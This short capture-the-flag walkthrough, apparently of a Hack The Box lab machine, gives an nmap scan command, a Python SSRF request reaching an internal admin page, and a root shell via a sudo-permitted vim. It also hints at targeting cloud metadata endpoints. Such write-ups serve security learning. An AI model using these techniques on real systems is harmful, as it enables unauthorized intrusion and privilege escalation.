Enumeration

Starting with a standard nmap scan:

1nmap -sC -sV -oA nmap/initial 10.10.10.1

The results showed ports 22 and 80 open. Let’s check the web application.

Foothold

The application had a URL fetch feature — classic SSRF candidate.

1import requests
2
3payload = "http://127.0.0.1:8080/admin"
4r = requests.get(f"https://target.htb/fetch?url={payload}")
5print(r.text)

Note: Always check internal services when you find an SSRF. Cloud metadata endpoints are a goldmine.

Privilege Escalation

Checking sudo permissions:

1sudo -l
2# (root) NOPASSWD: /usr/bin/vim

Easy privesc via vim:

1sudo vim -c ':!/bin/bash'
